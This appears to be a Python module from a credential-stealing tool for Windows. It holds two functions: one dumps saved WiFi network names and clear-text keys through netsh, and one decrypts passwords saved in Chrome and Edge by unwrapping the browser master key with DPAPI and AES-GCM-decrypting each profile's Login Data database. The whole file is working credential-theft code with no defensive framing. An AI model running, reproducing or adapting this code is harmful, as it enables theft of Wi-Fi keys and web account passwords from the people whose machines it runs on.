import os
import re
import shutil
import sqlite3
import base64
import subprocess
import json as js


def wifi_dump():
    try:
        command_out = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles']
        ).decode('utf-8', errors="backslashreplace")
        profiles = re.findall(r"All User Profile\s*:\s(.*)", command_out)
        wifi_list = ""
        if not profiles:
            return '[-] No WiFi profiles found'
        for profile in profiles:
            profile = profile.strip()
            try:
                results = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                ).decode('utf-8', errors="backslashreplace")
                results_rows = results.split('\n')
                password = [
                    line.split(":")[1][1:-1]
                    for line in results_rows if "Key Content" in line
                ]
                if password:
                    wifi_list += f"SSID: {profile:<20} Password: {password[0]}\n"
                else:
                    wifi_list += f"SSID: {profile:<20} Password: [Open/No Key]\n"
            except Exception:
                wifi_list += f"SSID: {profile:<20} Password: [Error]\n"
        return wifi_list
    except Exception as e:
        return f'[-] Error dumping wifi: {str(e)}'


def browser_credentials():
    try:
        from Crypto.Cipher import AES
        import win32crypt

        results = []

        browsers = {
            'Chrome': os.path.join(
                os.environ['LOCALAPPDATA'],
                r'Google\Chrome\User Data'
            ),
            'Edge': os.path.join(
                os.environ['LOCALAPPDATA'],
                r'Microsoft\Edge\User Data'
            )
        }

        for browser_name, browser_path in browsers.items():
            if not os.path.exists(browser_path):
                continue

            local_state_path = os.path.join(browser_path, 'Local State')
            if not os.path.exists(local_state_path):
                continue

            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = js.load(f)

            encrypted_key = base64.b64decode(
                local_state['os_crypt']['encrypted_key']
            )
            encrypted_key = encrypted_key[5:]
            decryption_key = win32crypt.CryptUnprotectData(
                encrypted_key, None, None, None, 0
            )[1]

            for item in os.listdir(browser_path):
                if item == 'Default' or item.startswith('Profile'):
                    db_path = os.path.join(
                        browser_path, item, 'Login Data'
                    )
                    if not os.path.exists(db_path):
                        continue

                    temp_db = os.path.join(
                        os.environ['TEMP'], 'login_temp.db'
                    )
                    shutil.copy2(db_path, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    try:
                        cursor.execute(
                            'SELECT origin_url, username_value, password_value FROM logins'
                        )
                        for row in cursor.fetchall():
                            url, username, encrypted_password = row
                            if username and encrypted_password:
                                try:
                                    iv = encrypted_password[3:15]
                                    payload = encrypted_password[15:]
                                    cipher = AES.new(
                                        decryption_key, AES.MODE_GCM, iv
                                    )
                                    password = cipher.decrypt(payload)[:-16].decode()
                                    results.append(
                                        f"[{browser_name}] {url}\n  User: {username}\n  Pass: {password}"
                                    )
                                except Exception:
                                    pass
                    except Exception:
                        pass
                    finally:
                        cursor.close()
                        conn.close()
                        os.remove(temp_db)

        if results:
            return "\n\n".join(results)
        return "[-] No saved credentials found"

    except ImportError as e:
        return f"[-] Missing module: {str(e)}"
    except Exception as e:
        return f"[-] Browser creds error: {str(e)}"
